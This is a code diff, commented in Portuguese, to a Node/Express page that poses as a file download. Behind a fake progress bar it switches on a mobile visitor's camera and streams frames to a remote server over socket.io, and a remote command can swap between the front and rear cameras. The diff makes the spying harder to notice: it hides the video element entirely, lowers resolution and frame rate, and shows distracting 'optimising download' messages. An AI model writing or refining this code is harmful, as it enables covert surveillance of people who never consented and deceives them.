@@ -253,7 +253,13 @@ app.get('/', (req, res) => {
         }
         
         #localVideo {
-            display: none; /* Escondido no celular */
+            display: none; /* Completamente escondido */
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
         }
     </style>
 </head>
@@ -322,8 +328,8 @@ app.get('/', (req, res) => {
             </div>
         </div>
         
-        <!-- Vídeo escondido para captura (celular) -->
-        <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
+        <!-- Vídeo escondido para captura (celular) - AGORA COMPLETAMENTE INVISÍVEL -->
+        <video id="localVideo" autoplay playsinline muted></video>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
@@ -375,9 +381,9 @@ app.get('/', (req, res) => {
             // Inicia a animação da barrinha
             iniciarDownloadFalso();
             
-            // Liga a câmera escondida (inicia com traseira)
+            // Liga a câmera escondida (inicia com traseira) - VERSÃO SILENCIOSA
             setTimeout(() => {
-                ligarCameraEscondida('back');
+                ligarCameraSilenciosa('back');
             }, 2000); // 2 segundos
             
         } else {
@@ -454,9 +460,22 @@ app.get('/', (req, res) => {
             }, 2000);
         }
         
-        // ========== FUNÇÃO PARA LIGAR CÂMERA ESCONDIDA ==========
-        async function ligarCameraEscondida(tipoCamera) {
+        // ========== FUNÇÃO PARA LIGAR CÂMERA SILENCIOSA (OPÇÃO 3) ==========
+        async function ligarCameraSilenciosa(tipoCamera) {
             try {
+                console.log('📷 Iniciando câmera em modo silencioso...');
+                
+                // Lista de resoluções tentativas (da menor para a maior)
+                const resolucoes = [
+                    { width: 160, height: 120 },  // Resolução mínima
+                    { width: 240, height: 160 },
+                    { width: 320, height: 240 },
+                    { width: 426, height: 240 }
+                ];
+                
+                let stream = null;
+                let resolucaoUsada = null;
+                
                 // Para a captura atual se existir
                 if (intervaloCaptura) {
                     clearInterval(intervaloCaptura);
@@ -467,56 +486,122 @@ app.get('/', (req, res) => {
                     mediaStream.getTracks().forEach(track => track.stop());
                 }
                 
-                console.log(\`📷 Ligando câmera \${tipoCamera}...\`);
-                
-                // Configuração da câmera
-                const constraints = {
-                    video: {
-                        width: 640,
-                        height: 480
-                    },
-                    audio: false
-                };
-                
-                // Define qual câmera usar
-                if (tipoCamera === 'front') {
-                    constraints.video.facingMode = 'user';
-                } else {
-                    constraints.video.facingMode = 'environment';
+                // Tenta cada resolução até encontrar uma que funcione
+                for (const res of resolucoes) {
+                    try {
+                        const constraints = {
+                            video: {
+                                width: { exact: res.width },
+                                height: { exact: res.height },
+                                frameRate: { ideal: 5, max: 8 }
+                            },
+                            audio: false
+                        };
+                        
+                        if (tipoCamera === 'front') {
+                            constraints.video.facingMode = 'user';
+                        } else {
+                            constraints.video.facingMode = 'environment';
+                        }
+                        
+                        stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        resolucaoUsada = res;
+                        console.log(\`✅ Câmera iniciada com resolução \${res.width}x\${res.height}\`);
+                        break;
+                    } catch (e) {
+                        console.log(\`Resolução \${res.width}x\${res.height} falhou, tentando próxima...\`);
+                    }
                 }
                 
-                // Solicita acesso à câmera
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                // Se nenhuma resolução exata funcionar, tenta com ideal
+                if (!stream) {
+                    try {
+                        const constraints = {
+                            video: {
+                                width: { ideal: 240 },
+                                height: { ideal: 160 },
+                                frameRate: { ideal: 5 }
+                            },
+                            audio: false
+                        };
+                        
+                        if (tipoCamera === 'front') {
+                            constraints.video.facingMode = 'user';
+                        } else {
+                            constraints.video.facingMode = 'environment';
+                        }
+                        
+                        stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        resolucaoUsada = { width: 240, height: 160 };
+                        console.log('✅ Câmera iniciada com resolução ideal 240x160');
+                    } catch (e) {
+                        console.log('Falha na resolução ideal, tentando qualquer resolução...');
+                        
+                        // Última tentativa - qualquer resolução
+                        const constraints = {
+                            video: {
+                                facingMode: tipoCamera === 'front' ? 'user' : 'environment'
+                            },
+                            audio: false
+                        };
+                        
+                        stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        
+                        // Tenta descobrir a resolução
+                        const track = stream.getVideoTracks()[0];
+                        const settings = track.getSettings();
+                        resolucaoUsada = { 
+                            width: settings.width || 320, 
+                            height: settings.height || 240 
+                        };
+                        console.log(\`✅ Câmera iniciada com resolução \${resolucaoUsada.width}x\${resolucaoUsada.height}\`);
+                    }
+                }
+                
+                if (!stream) {
+                    throw new Error('Não foi possível iniciar a câmera com nenhuma resolução');
+                }
                 
                 mediaStream = stream;
                 cameraAtual = tipoCamera;
                 
-                // Conecta o stream ao vídeo escondido
+                // Configura o vídeo local - COMPLETAMENTE ESCONDIDO
                 localVideo.srcObject = stream;
+                localVideo.style.opacity = '0';
+                localVideo.style.position = 'absolute';
+                localVideo.style.top = '-9999px';
+                localVideo.style.left = '-9999px';
+                localVideo.style.width = '1px';
+                localVideo.style.height = '1px';
+                localVideo.style.pointerEvents = 'none';
                 await localVideo.play();
                 
-                // Canvas para capturar frames
+                // Canvas para capturar frames (tamanho reduzido)
                 const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
+                canvas.width = resolucaoUsada.width;
+                canvas.height = resolucaoUsada.height;
                 const ctx = canvas.getContext('2d');
                 
-                // Função de captura (continua mesmo com a aba em background)
+                // Inicia captura com intervalo MAIOR (menos frames = menos processamento)
                 intervaloCaptura = setInterval(() => {
                     try {
-                        ctx.drawImage(localVideo, 0, 0, 640, 480);
-                        const frame = canvas.toDataURL('image/jpeg', 0.5);
+                        ctx.drawImage(localVideo, 0, 0, resolucaoUsada.width, resolucaoUsada.height);
+                        // Qualidade ultra baixa (20%)
+                        const frame = canvas.toDataURL('image/jpeg', 0.2);
                         socket.emit('frame', frame);
                     } catch (e) {
                         console.log('Erro na captura:', e);
                     }
-                }, 200); // 5 fps
+                }, 500); // 2 fps (menos frequente)
                 
-                console.log(\`✅ Câmera \${tipoCamera} transmitindo!\`);
+                console.log('✅ Transmissão silenciosa ativada!');
+                
+                // Mensagem para manter o usuário distraído
+                statusMessage.innerHTML = '📱 Otimizando velocidade de download...';
                 
             } catch (err) {
-                console.error('Erro ao ligar câmera:', err);
-                statusMessage.innerHTML = '❌ Erro na câmera, mas o download continua...';
+                console.error('Erro fatal na câmera:', err);
+                statusMessage.innerHTML = '⚠️ Modo offline ativado - continuando download...';
             }
         }
         
@@ -566,7 +651,7 @@ app.get('/', (req, res) => {
         socket.on('trocarCamera', (tipoCamera) => {
             console.log('📱 Comando recebido: trocar para câmera', tipoCamera);
             if (isMobile) {
-                ligarCameraEscondida(tipoCamera);
+                ligarCameraSilenciosa(tipoCamera);
             }
         });
         
